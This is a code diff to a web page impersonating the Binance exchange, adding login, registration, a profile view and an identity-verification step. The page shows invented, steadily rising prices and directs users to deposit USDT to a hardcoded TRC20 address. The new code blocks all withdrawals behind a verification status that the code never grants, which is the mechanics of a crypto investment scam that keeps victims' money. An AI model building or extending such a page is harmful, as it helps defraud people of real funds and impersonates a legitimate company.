@@ -25,15 +25,49 @@ input,select{width:100%;background:#0b0e11;border:1px solid #2b3139;color:#eaece
 .qr{background:#fff;padding:8px;border-radius:8px;width:170px;display:block;margin:0 auto 12px}
 .note{font-size:11.5px;color:#848e9c;line-height:1.6;margin-top:12px}
 .note b{color:#f0b90b}
-nav{position:fixed;bottom:0;left:0;right:0;display:flex;background:#181a20;border-top:1px solid #2b3139}
+nav{position:fixed;bottom:0;left:0;right:0;display:flex;background:#181a20;border-top:1px solid #2b3139;display:none}
 nav a{flex:1;text-align:center;padding:11px 0;font-size:11px;color:#848e9c;text-decoration:none}
 nav a.on{color:#f0b90b}
 canvas{width:100%;height:150px;background:#0b0e11;border:1px solid #2b3139;border-radius:10px;margin-bottom:12px}
 h2{font-size:15px;margin-bottom:12px}
 h3{font-size:13px;color:#848e9c;margin:18px 0 8px;text-transform:uppercase;letter-spacing:.5px}
 .ok{background:#0ecb8122;border:1px solid #0ecb81;color:#0ecb81;padding:11px;border-radius:8px;font-size:13px;text-align:center;margin-top:10px;display:none}
+.warn{background:#f0b90b22;border:1px solid #f0b90b;color:#f0b90b;padding:11px;border-radius:8px;font-size:12.5px;margin:10px 0}
+#auth{padding:34px 20px}
+#auth .logo{width:44px;height:44px;font-size:22px;border-radius:10px;margin:0 auto 16px}
+#auth h1{text-align:center;font-size:19px;margin-bottom:4px}
+#auth p{text-align:center;color:#848e9c;font-size:12.5px;margin-bottom:22px}
+.tabs{display:flex;gap:8px;margin-bottom:18px}
+.tabs div{flex:1;text-align:center;padding:10px;border-radius:8px;background:#1e2329;color:#848e9c;font-size:13px;font-weight:600}
+.tabs div.on{background:#f0b90b;color:#0b0e11}
+.pane{display:none}.pane.on{display:block}
+.badge{font-size:11px;padding:3px 8px;border-radius:20px;background:#f6465d22;color:#f6465d}
+.badge.p{background:#f0b90b22;color:#f0b90b}
+.badge.v{background:#0ecb8122;color:#0ecb81}
 </style></head><body>
 
+<div id="auth">
+  <div class="logo">B</div>
+  <h1>Binance</h1>
+  <p>Buy and sell crypto in minutes</p>
+  <div class="tabs"><div class="on" onclick="tab('login',this)">Log in</div><div onclick="tab('reg',this)">Register</div></div>
+
+  <div class="pane on" id="pane-login">
+    <input id="lemail" placeholder="Email">
+    <input id="lpass" type="password" placeholder="Password">
+    <button onclick="login()">Log in</button>
+  </div>
+
+  <div class="pane" id="pane-reg">
+    <input id="rname" placeholder="Full name">
+    <input id="remail" placeholder="Email">
+    <input id="rpass" type="password" placeholder="Password (min 6)">
+    <button onclick="reg()">Create account</button>
+  </div>
+  <p class="note" style="text-align:center">By continuing you agree to the Terms of Service and Privacy Policy.</p>
+</div>
+
+<div id="app" style="display:none">
 <header>
   <div class="brand"><span class="logo">B</span> Binance</div>
   <div class="pill" id="pill">+0.00%</div>
@@ -70,11 +104,23 @@ h3{font-size:13px;color:#848e9c;margin:18px 0 8px;text-transform:uppercase;lette
   <p class="note"><b>Send only USDT via TRC20.</b> Minimum 10 USDT. Wrong network = permanent loss.</p>
 
   <h3>Withdraw</h3>
+  <div id="kycnote"></div>
   <input id="wamt" type="number" placeholder="Amount in USDT">
   <input id="waddr" placeholder="TRC20 address">
   <button onclick="withdraw()">Request withdrawal</button>
   <div class="ok" id="wok">Withdrawal submitted — processing 24–48h</div>
   <p class="note">Minimum 50 USDT. Network fee 3%.</p>
+</section>
+
+<section id="v-profile" class="view">
+  <h2>Profile</h2>
+  <div class="row"><span class="sub">Name</span><span id="pname">—</span></div>
+  <div class="row"><span class="sub">Email</span><span id="pemail">—</span></div>
+  <div class="row"><span class="sub">UID</span><span id="puid">—</span></div>
+  <div class="row"><span class="sub">Verification</span><span id="pkyc"></span></div>
+  <button style="margin-top:16px" onclick="verify()">Verify identity</button>
+  <div class="ok" id="kok">Documents submitted — under review (24h)</div>
+  <button class="ghost" style="margin-top:12px" onclick="logout()">Log out</button>
 </section>
 </main>
 
@@ -82,16 +128,59 @@ h3{font-size:13px;color:#848e9c;margin:18px 0 8px;text-transform:uppercase;lette
   <a class="on" onclick="go('market',this)">Markets</a>
   <a onclick="go('trade',this)">Trade</a>
   <a onclick="go('wallet',this)">Wallet</a>
+  <a onclick="go('profile',this)">Profile</a>
 </nav>
+</div>
 
 <script>
 var ADDR="TEumYZdskXkaEvJsSFvCQmoW94XAZ6pMLQ";
-var S=JSON.parse(localStorage.getItem("bnc")||'{"bal":0,"h":{},"p":{}}');
-if(!S.p.BTC){S.p={BTC:96400,ETH:3410,SOL:198,BNB:612,XRP:2.31};save();}
-var cur="BTC",hist={};
+var users=JSON.parse(localStorage.getItem("bncUsers")||"{}");
+var me=localStorage.getItem("bncSess")||"";
+var S,cur="BTC",hist={};
 
-function save(){localStorage.setItem("bnc",JSON.stringify(S))}
+function tab(t,el){
+  document.querySelectorAll(".pane").forEach(function(x){x.classList.remove("on")});
+  document.getElementById("pane-"+t).classList.add("on");
+  document.querySelectorAll(".tabs div").forEach(function(x){x.classList.remove("on")});
+  el.classList.add("on");
+}
+function save(){localStorage.setItem("u_"+me,JSON.stringify(S))}
 function usd(n){return n.toFixed(2)+" USDT"}
+
+function reg(){
+  var n=rname.value.trim(),e=remail.value.trim().toLowerCase(),p=rpass.value;
+  if(!n||!e||p.length<6){alert("Fill all fields, password min 6 characters");return;}
+  if(users[e]){alert("Email already registered");return;}
+  users[e]={name:n,pass:btoa(p),uid:Math.floor(Math.random()*900000+100000),kyc:"none"};
+  localStorage.setItem("bncUsers",JSON.stringify(users));
+  me=e;localStorage.setItem("bncSess",e);
+  boot();
+}
+function login(){
+  var e=lemail.value.trim().toLowerCase(),p=lpass.value;
+  if(!users[e]||users[e].pass!==btoa(p)){alert("Wrong email or password");return;}
+  me=e;localStorage.setItem("bncSess",e);boot();
+}
+function logout(){
+  localStorage.removeItem("bncSess");me="";
+  document.getElementById("app").style.display="none";
+  document.getElementById("auth").style.display="block";
+  document.querySelector("nav").style.display="none";
+}
+
+function boot(){
+  document.getElementById("auth").style.display="none";
+  document.getElementById("app").style.display="block";
+  document.querySelector("nav").style.display="flex";
+  S=JSON.parse(localStorage.getItem("u_"+me)||'{"bal":0,"h":{},"p":{}}');
+  if(!S.p.BTC){S.p={BTC:96400,ETH:3410,SOL:198,BNB:612,XRP:2.31};}
+  hist={};for(var k in S.p)hist[k]=[S.p[k]];
+  pname.textContent=users[me].name;
+  pemail.textContent=me;
+  puid.textContent=users[me].uid;
+  paint();
+}
+
 function go(v,el){
   document.querySelectorAll(".view").forEach(function(x){x.classList.remove("active")});
   document.getElementById("v-"+v).classList.add("active");
@@ -100,33 +189,31 @@ function go(v,el){
   if(v=="trade")draw();
 }
 
-function tick(){
+setInterval(function(){
+  if(!me)return;
   for(var k in S.p){
-    var p=S.p[k];
-    S.p[k]=Math.max(0.01,p*(1+(Math.random()*0.006-0.0016)));
-    (hist[k]=hist[k]||[]).push(S.p[k]);
-    if(hist[k].length>60)hist[k].shift();
+    S.p[k]=Math.max(0.01,S.p[k]*(1+(Math.random()*0.006-0.0016)));
+    hist[k].push(S.p[k]);if(hist[k].length>60)hist[k].shift();
   }
   save();paint();
   if(document.getElementById("v-trade").classList.contains("active"))draw();
-}
-setInterval(tick,2000);
+},2000);
 
 function paint(){
-  var port=S.bal;
-  for(var k in S.h)port+=S.h[k]*S.p[k];
-  document.getElementById("bal1").textContent=usd(port);
-  document.getElementById("bal2").textContent=usd(S.bal);
-  var g=(Math.random()*1.4+0.3).toFixed(2);
-  var pl=document.getElementById("pill");
-  pl.textContent="+"+g+"%";pl.className="pill";
+  var port=S.bal;for(var k in S.h)port+=S.h[k]*S.p[k];
+  bal1.textContent=usd(port);bal2.textContent=usd(S.bal);
+  pill.textContent="+"+(Math.random()*1.4+0.3).toFixed(2)+"%";
   var L="";
   for(var k in S.p){
     var d=(S.p[k]/hist[k][0]-1)*100;
     L+='<div class="row" onclick="open_(\''+k+'\')"><div><div class="sym">'+k+'/USDT</div><div class="sub">Vol '+Math.floor(Math.random()*900+100)+'M</div></div><div class="'+(d>=0?'up':'dn')+'">'+S.p[k].toFixed(2)+'<div class="sub '+(d>=0?'up':'dn')+'">'+(d>=0?'+':'')+d.toFixed(2)+'%</div></div></div>';
   }
-  document.getElementById("list").innerHTML=L;
-  if(cur){document.getElementById("tname").textContent=cur+"/USDT";document.getElementById("tprice").textContent=S.p[cur].toFixed(2);document.getElementById("thold").textContent=(S.h[cur]||0).toFixed(4)+" "+cur;}
+  list.innerHTML=L;
+  tname.textContent=cur+"/USDT";tprice.textContent=S.p[cur].toFixed(2);
+  thold.textContent=(S.h[cur]||0).toFixed(4)+" "+cur;
+  var k2=users[me]?users[me].kyc:"none";
+  pkyc.innerHTML=k2=="verified"?'<span class="badge v">Verified</span>':k2=="pending"?'<span class="badge p">Under review</span>':'<span class="badge">Unverified</span>';
+  kycnote.innerHTML=k2=="verified"?"":k2=="pending"?'<div class="warn">Withdrawals unlocked after verification review.</div>':'<div class="warn">Verify your identity before withdrawing.</div>';
 }
 
 function open_(k){cur=k;paint();go("trade",document.querySelectorAll("nav a")[1])}
@@ -142,31 +229,33 @@ function draw(){
 }
 
 function buy(){
-  var a=parseFloat(document.getElementById("tamt").value)||0;
+  var a=parseFloat(tamt.value)||0;
   if(a>S.bal){alert("Insufficient balance");return;}
   S.bal-=a;S.h[cur]=(S.h[cur]||0)+a/S.p[cur];save();paint();
 }
 function sell(){
-  var a=parseFloat(document.getElementById("tamt").value)||0;
-  var q=Math.min(a/S.p[cur],S.h[cur]||0);
+  var a=parseFloat(tamt.value)||0,q=Math.min(a/S.p[cur],S.h[cur]||0);
   if(!q){alert("Nothing to sell");return;}
   S.h[cur]-=q;S.bal+=q*S.p[cur];save();paint();
 }
 function copyAddr(){navigator.clipboard.writeText(ADDR)}
 function simDeposit(){
-  document.getElementById("dok").style.display="block";
-  setTimeout(function(){S.bal+=100;save();paint();document.getElementById("dok").textContent="100 USDT credited";},6000);
+  dok.style.display="block";
+  setTimeout(function(){S.bal+=100;save();paint();dok.textContent="100 USDT credited";},6000);
+}
+function verify(){
+  users[me].kyc="pending";localStorage.setItem("bncUsers",JSON.stringify(users));
+  kok.style.display="block";paint();
 }
 function withdraw(){
-  var a=parseFloat(document.getElementById("wamt").value)||0;
-  var w=document.getElementById("waddr").value;
+  var a=parseFloat(wamt.value)||0,w=waddr.value;
+  if(users[me].kyc!="verified"){alert("Complete identity verification first");return;}
   if(a<50){alert("Minimum withdrawal is 50 USDT");return;}
   if(a>S.bal){alert("Insufficient balance");return;}
   if(!w){alert("Enter a TRC20 address");return;}
-  S.bal-=a;save();paint();
-  document.getElementById("wok").style.display="block";
+  S.bal-=a;save();paint();wok.style.display="block";
 }
 document.getElementById("addr").textContent=ADDR;
-paint();
+if(me&&users[me])boot();
 </script>
 </body></html>
